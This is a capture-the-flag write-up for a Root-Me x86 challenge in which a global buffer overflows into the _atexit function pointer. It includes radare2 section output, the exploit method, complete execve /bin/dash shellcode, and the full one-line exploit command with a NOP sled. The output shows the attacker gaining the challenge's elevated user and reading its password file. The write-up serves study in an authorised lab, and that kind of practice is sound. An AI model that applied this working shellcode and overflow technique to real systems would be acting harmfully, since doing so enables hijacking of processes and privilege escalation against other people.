# BSS buffer overflow

    https://www.root-me.org/en/Challenges/App-System/ELF-x86-BSS-buffer-overflow

Name of challenge is BSS overflow.  Except that the global variables are initialised and, as can be seen from radare2 output, are in the .data.  Same method works regardless.

    [0xb7fdf030]> iS
    idx=24 vaddr=0x0804a020 paddr=0x00001020 sz=548 vsz=548 perm=--rw- name=.data
    idx=25 vaddr=0x0804a244 paddr=0x00001244 sz=8 vsz=8 perm=--rw- name=.bss
    
    [0xb7fdf030]> f
    vaddr=0x0804a040 paddr=0x00001040 ord=058 fwd=NONE sz=512 bind=GLOBAL type=OBJECT name=username
    vaddr=0x0804a240 paddr=0x00001240 ord=053 fwd=NONE sz=4 bind=GLOBAL type=OBJECT name=_atexit


Overflow of buffer into the _atexit function pointer.

                     512bytes |
    <nop padding> + <shellcode> + <obj.username>


Method:
    
    * Get address of string
    * NULL terminate the string
    * Setup and make call to sys_execve
    * Setup and make call to sys_exit


Of interest:

    * 0x09 is the TAB character and will cut off the cmdline argument


    ./shellcode.py
    shellcode: 
    \xeb\x1d\x5b\x31\xd2\x89\xd9\x83\xc1\x04\x83\xc1\x05\x88\x11\x31\xc0\xb0\x0b\x31\xc9\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41
    bytes    : 46

    $(python -c 'print "\x90" * 466 + "\xeb\x1d\x5b\x31\xd2\x89\xd9\x83\xc1\x04\x83\xc1\x05\x88\x11\x31\xc0\xb0\x0b\x31\xc9\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41" + "\x40\xa0\x04\x08"')

    $ id
    uid=1107(app-systeme-ch7) gid=1107(app-systeme-ch7) euid=1207(app-systeme-ch7-cracked) groups=1207(app-systeme-ch7-cracked),100(users),1107(app-systeme-ch7)
    $ cat .passwd
    ...
